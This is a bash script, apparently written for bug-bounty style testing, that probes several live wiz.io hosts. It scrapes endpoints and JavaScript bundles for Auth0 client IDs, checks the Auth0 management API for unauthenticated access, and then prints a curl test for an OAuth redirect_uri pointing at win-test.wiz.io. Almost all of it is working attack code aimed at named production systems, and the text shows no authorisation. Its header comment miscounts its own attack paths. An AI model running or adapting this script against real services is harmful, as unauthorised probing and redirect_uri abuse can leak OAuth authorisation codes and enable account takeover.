#!/usr/bin/env bash
# extract-clientid-wiz.sh
# Extracts Auth0 client_id for win-test.wiz.io OAuth redirect_uri chain test.
#
# Three attack paths in priority order:
#   1. NextAuth.js /api/auth/providers endpoint (exposes client_id directly)
#   2. Next.js JS bundle grep (client config often bundled)
#   3. auth.app.wiz.io OIDC discovery (internal auth service)
#   4. community.wiz.io frontend source (Discourse embeds Auth0 config)
set -euo pipefail

OUT="results/wiz.io/chain-tests"
mkdir -p "$OUT"

UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'
hit()  { echo -e "${RED}[FOUND]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }

echo ""
echo -e "${CYAN}═══ Auth0 client_id Extraction — wiz.io ═══${NC}"
echo ""

# ─── Path 1: NextAuth.js API endpoints ─────────────────────────────────────
info "Path 1: NextAuth.js /api/auth/* (app.wiz.io is Next.js)"
for ep in "/api/auth/providers" "/api/auth/csrf" "/api/auth/session" "/api/auth/_log"; do
  echo -n "  app.wiz.io$ep → "
  R=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io$ep" 2>/dev/null)
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "https://app.wiz.io$ep" 2>/dev/null)
  echo "HTTP $CODE"
  if [ "$CODE" = "200" ] && echo "$R" | grep -qi "clientId\|client_id\|auth0\|issuer"; then
    hit "  $ep exposed auth config:"
    echo "$R" | python3 -m json.tool 2>/dev/null | head -20 | tee -a "$OUT/clientid-found.txt"
  fi
done
echo ""

# ─── Path 2: auth.app.wiz.io (explicit in app CSP connect-src) ─────────────
info "Path 2: auth.app.wiz.io (internal auth service)"
for ep in "/" "/.well-known/openid-configuration" "/authorize" "/login" "/health"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "https://auth.app.wiz.io$ep" 2>/dev/null)
  echo "  auth.app.wiz.io$ep → HTTP $CODE"
  if [ "$CODE" = "200" ]; then
    R=$(curl -sk -H "User-Agent: $UA" "https://auth.app.wiz.io$ep" 2>/dev/null)
    echo "$R" | python3 -m json.tool 2>/dev/null | head -20 | tee -a "$OUT/auth-app-wiz.txt"
    echo "$R" | grep -oiE '"(client_id|clientId|issuer|authorization_endpoint)"[^,}]+' | tee -a "$OUT/clientid-found.txt"
  fi
done
echo ""

# ─── Path 3: Next.js JS bundle grep ─────────────────────────────────────────
info "Path 3: Next.js bundle grep for Auth0 config"
echo "  Fetching app.wiz.io homepage to find bundle URLs..."
PAGE=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io/" 2>/dev/null)
BUNDLES=$(echo "$PAGE" | grep -oE '"/_next/static/chunks/[^"]+\.js"' | tr -d '"' | sort -u | head -10)
if [ -z "$BUNDLES" ]; then
  echo "  No /_next bundles found — trying static asset hints..."
  BUNDLES=$(echo "$PAGE" | grep -oE 'src="[^"]*\.js[^"]*"' | grep -oE '"[^"]*\.js[^"]*"' | tr -d '"' | head -10)
fi
echo "$BUNDLES" | while read -r bundle; do
  [ -z "$bundle" ] && continue
  URL="https://app.wiz.io$bundle"
  echo -n "  Scanning $(basename "$bundle" | cut -c1-30)... "
  CONTENT=$(curl -sk -H "User-Agent: $UA" "$URL" 2>/dev/null)
  MATCH=$(echo "$CONTENT" | grep -oE '"clientId":"[A-Za-z0-9_-]{10,}"' | head -3)
  if [ -n "$MATCH" ]; then
    hit "  Found in $bundle:"
    echo "$MATCH" | tee -a "$OUT/clientid-found.txt"
  else
    # Also look for Auth0 domain pattern
    DOMAIN_MATCH=$(echo "$CONTENT" | grep -oE '"domain":"[A-Za-z0-9_.-]*\.auth0\.com"' | head -1)
    [ -n "$DOMAIN_MATCH" ] && hit "  Auth0 domain: $DOMAIN_MATCH"
    AUTH_MATCH=$(echo "$CONTENT" | grep -oE '"domain":"[a-z0-9_.-]*\.wiz\.io"' | head -3)
    if [ -n "$AUTH_MATCH" ]; then
      hit "  Auth domain found:"
      echo "$AUTH_MATCH" | tee -a "$OUT/clientid-found.txt"
      echo -n ""
    else
      echo "clean"
    fi
  fi
done
echo ""

# ─── Path 4: community.wiz.io JS source ─────────────────────────────────────
info "Path 4: community.wiz.io JS source (Discourse/tightknit SSO config)"
COMM_PAGE=$(curl -sk -H "User-Agent: $UA" "https://community.wiz.io/" 2>/dev/null)
echo "$COMM_PAGE" | grep -oE '"clientId":"[^"]*"' | head -5 | tee -a "$OUT/clientid-found.txt"
echo "$COMM_PAGE" | grep -oE 'client_id=[A-Za-z0-9_-]+' | head -5 | tee -a "$OUT/clientid-found.txt"
# Look for Tightknit AI configuration (community.wiz.io uses tightknit)
echo "$COMM_PAGE" | grep -oE '"[A-Za-z0-9]{20,}"' | head -5  # potential long IDs
COMM_SCRIPTS=$(echo "$COMM_PAGE" | grep -oE 'src="[^"]*/_next/[^"]+\.js"' | tr -d 'src="' | head -5)
echo "$COMM_SCRIPTS" | while read -r s; do
  [ -z "$s" ] && continue
  C=$(curl -sk -H "User-Agent: $UA" "https://community.wiz.io$s" 2>/dev/null)
  M=$(echo "$C" | grep -oE 'clientId[^,;)]{3,40}' | head -3)
  [ -n "$M" ] && hit "community.wiz.io $s: $M"
done
echo ""

# ─── Path 5: auth.wiz.io management API probe ───────────────────────────────
info "Path 5: auth.wiz.io — check for unauthenticated API exposure"
# Auth0 management API is usually protected, but test basic exposure
for ep in "/.well-known/openid-configuration" "/api/v2/clients?fields=client_id,name" \
           "/authorize" "/.well-known/jwks.json"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "https://auth.wiz.io$ep" 2>/dev/null)
  echo -n "  auth.wiz.io$ep → HTTP $CODE"
  if [ "$CODE" = "200" ]; then
    echo " ← open!"
    curl -sk -H "User-Agent: $UA" "https://auth.wiz.io$ep" 2>/dev/null \
      | python3 -m json.tool 2>/dev/null | head -10 | tee -a "$OUT/auth-wiz-probe.txt"
  else
    echo ""
  fi
done
echo ""

# ─── Path 6: hey.wiz.io (in www.wiz.io CSP connect-src) ────────────────────
info "Path 6: hey.wiz.io (found in www.wiz.io CSP — may be API/webhook service)"
curl -sk -H "User-Agent: $UA" "https://hey.wiz.io/" -D - 2>/dev/null \
  | head -25 | tee "$OUT/hey-wiz-probe.txt"
echo ""

# ─── Summary ────────────────────────────────────────────────────────────────
echo -e "${CYAN}═══ Results ═══${NC}"
if [ -s "$OUT/clientid-found.txt" ]; then
  hit "client_id candidates found:"
  sort -u "$OUT/clientid-found.txt"
  echo ""
  echo "NEXT: Run OAuth redirect_uri test with extracted client_id:"
  echo "  CLIENT_ID=<value>"
  echo "  AUTH_DOMAIN=auth.wiz.io   # or auth0.demo.wiz.io / auth0.e2e.wiz.io"
  echo "  curl -sI --max-redirs 0 \\"
  echo "    \"https://\${AUTH_DOMAIN}/authorize?response_type=code&client_id=\${CLIENT_ID}&redirect_uri=https://win-test.wiz.io/callback&scope=openid+profile&state=poc123\" \\"
  echo "    | grep -i 'location:'"
  echo "  # HIT: Location: https://win-test.wiz.io/callback?code=...  → CRITICAL"
  echo "  # MISS: Location: error page or callback_url_mismatch"
else
  echo "  No client_id found via automated extraction."
  echo "  Manual option: Open https://community.wiz.io in browser → DevTools → Network → filter 'auth0'"
  echo "  The authorize request URL will contain client_id= in plaintext"
fi
